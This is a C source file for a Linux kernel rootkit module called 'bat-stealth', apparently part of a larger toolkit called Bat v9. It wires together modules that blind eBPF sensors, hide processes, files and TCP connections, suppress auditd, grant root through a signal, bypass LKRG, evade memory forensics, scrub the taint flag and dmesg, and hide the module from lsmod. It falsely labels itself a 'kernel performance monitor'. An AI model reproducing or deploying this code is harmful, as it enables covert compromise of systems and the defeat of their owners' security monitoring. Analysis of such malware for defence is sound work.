/* bat-stealth.ko   Kernel-level stealth layer for Bat v9.
 *
 * S1 modules: ftrace_helper, pid_manager, sysfs_iface, bpf_hook, hiding_tcp
 * S2 modules: audit, hiding_fs, become_root, lkrg_bypass, selfdefense,
 *             reset_tainted, clear_taint_dmesg, sysrq_hook, taskstats_hook,
 *             hide_module
 *
 * Init order (CRITICAL   do not reorder):
 *   1. pid_manager         arrays ready before any hook fires
 *   2. sysfs_iface         /sys/kernel/bat_stealth/ created (bat-agent writes here)
 *   3. bpf_hook            eBPF sensors blinded (P-01..P-26)
 *   4. hiding_tcp          connections hidden from ss/netstat
 *   5. audit               auditd events suppressed
 *   6. hiding_fs           filesystem entries hidden
 *   7. become_root         signal 59 triggers uid=0 + PID-enum blocking
 *   8. lkrg_bypass         LKRG enforcement disabled
 *   9. selfdefense         memory forensics evasion (LiME, kallsyms, kprobe)
 *  10. reset_tainted       /proc/sys/kernel/tainted → 0
 *  11. clear_taint_dmesg   dmesg/log lines filtered
 *  12. sysrq_hook          SysRq task dump hidden
 *  13. taskstats_hook      NETLINK taskstats filtered (graceful no-op if unavailable)
 *  14. hide_module         LAST: removes bat-stealth from lsmod/sysfs/kallsyms
 *
 * Unload (K-99):
 *   Phase 1: echo "1" > /sys/kernel/bat_stealth/unload
 *     → selfdefense_exit() + module_unhide()   (S2 wired here)
 *     → module becomes visible again to the kernel
 *   Phase 2: delete_module("bat_stealth", O_NONBLOCK)
 *     → kernel calls __exit below
 */
#include "include/core.h"
#include "include/pid_manager.h"
#include "include/sysfs_iface.h"
#include "include/bpf_hook.h"
#include "include/hiding_tcp.h"
#include "include/audit.h"
#include "include/hiding_fs.h"
#include "include/become_root.h"
#include "include/lkrg_bypass.h"
#include "include/selfdefense.h"
#include "include/reset_tainted.h"
#include "include/clear_taint_dmesg.h"
#include "include/sysrq_hook.h"
#include "include/taskstats_hook.h"
#include "include/hide_module.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("internal");
MODULE_DESCRIPTION("kernel performance monitor");
MODULE_VERSION("2.0");

static int __init bat_stealth_init(void)
{
    int ret;

    /* 1. pid_manager */
    ret = pid_manager_init();
    if (ret) {
        pr_err("bat-stealth: pid_manager_init failed: %d\n", ret);
        return ret;
    }

    /* 2. sysfs_iface */
    ret = sysfs_iface_init();
    if (ret) {
        pr_err("bat-stealth: sysfs_iface_init failed: %d\n", ret);
        goto err_pid;
    }

    /* 3. bpf_hook   non-fatal, partial install acceptable */
    ret = bpf_hook_init();
    if (ret != 0) {
        pr_warn("bat-stealth: bpf_hook_init partial: %d (continuing)\n", ret);
        goto err_sysfs;
    }

    /* 4. hiding_tcp */
    ret = hiding_tcp_init();
    if (ret) {
        pr_err("bat-stealth: hiding_tcp_init failed: %d\n", ret);
        goto err_bpf;
    }

    /* 5. audit */
    ret = audit_init();
    if (ret) {
        pr_warn("bat-stealth: audit_init failed: %d (continuing)\n", ret);
        /* Non-fatal   auditd may not be running */
    }

    /* 6. hiding_fs */
    ret = hiding_fs_init();
    if (ret) {
        pr_warn("bat-stealth: hiding_fs_init partial: %d (continuing)\n", ret);
    }

    /* 7. become_root */
    ret = become_root_init();
    if (ret) {
        pr_warn("bat-stealth: become_root_init failed: %d (continuing)\n", ret);
    }

    /* 8. lkrg_bypass   always returns 0 (graceful no-op without LKRG) */
    lkrg_bypass_init();

    /* 9. selfdefense */
    ret = selfdefense_init();
    if (ret) {
        pr_warn("bat-stealth: selfdefense_init failed: %d (continuing)\n", ret);
    }

    /* 10. reset_tainted */
    ret = reset_tainted_init();
    if (ret) {
        pr_warn("bat-stealth: reset_tainted_init failed: %d (continuing)\n", ret);
    }

    /* 11. clear_taint_dmesg */
    ret = clear_taint_dmesg_init();
    if (ret) {
        pr_warn("bat-stealth: clear_taint_dmesg_init failed: %d (continuing)\n", ret);
    }

    /* 12. sysrq_hook */
    ret = sysrq_hook_init();
    if (ret) {
        pr_warn("bat-stealth: sysrq_hook_init failed: %d (continuing)\n", ret);
    }

    /* 13. taskstats_hook   always returns 0 (graceful no-op) */
    taskstats_hook_init();

    /* 14. hide_module   MUST be last */
    module_hide_current();

    return 0;

    /* Error paths (only for fatal early failures) */
err_bpf:
    bpf_hook_exit();
err_sysfs:
    sysfs_iface_exit();
err_pid:
    pid_manager_exit();
    return ret;
}

static void __exit bat_stealth_exit(void)
{
    /* Reverse order   hide_module was already undone by module_unhide() in Phase 1 */
    taskstats_hook_exit();
    sysrq_hook_exit();
    clear_taint_dmesg_exit();
    reset_tainted_exit();
    selfdefense_exit();
    lkrg_bypass_exit();
    become_root_exit();
    hiding_fs_exit();
    audit_exit();
    hiding_tcp_exit();
    bpf_hook_exit();
    sysfs_iface_exit();
    pid_manager_exit();
}

module_init(bat_stealth_init);
module_exit(bat_stealth_exit);
